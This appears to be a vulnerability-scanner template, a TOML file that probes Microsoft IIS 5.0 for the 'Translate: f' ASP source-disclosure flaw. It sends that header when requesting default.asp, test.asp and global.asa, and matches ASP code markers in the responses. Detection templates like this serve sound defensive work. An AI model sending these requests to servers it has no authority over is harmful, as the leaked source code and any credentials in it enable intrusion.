[info]
author = "ave"
description = "检测 Microsoft IIS 5.0 是否存在 Translate: f 头导致的 ASP 源代码泄露漏洞"
id = "POC-AVE-2000-0588"
name = "Microsoft IIS 5.0 Translate: f Source Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0588"]
vuln_id = [
    "CVE-2000-0778",
    "AVE-2000-0588",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/default.asp"
protocol = "http"

[poc.requests.headers]
Translate = "f"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "%>",
    "Response.Write",
    "<script language=",
    "VBScript",
    "ASP",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test.asp"
protocol = "http"

[poc.requests.headers]
Translate = "f"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "%>",
    "Response.Write",
    "<script language=",
    "VBScript",
    "ASP",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/global.asa"
protocol = "http"

[poc.requests.headers]
Translate = "f"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "%>",
    "Application_OnStart",
    "Session_OnStart",
    "Application_OnEnd",
    "Session_OnEnd",
]
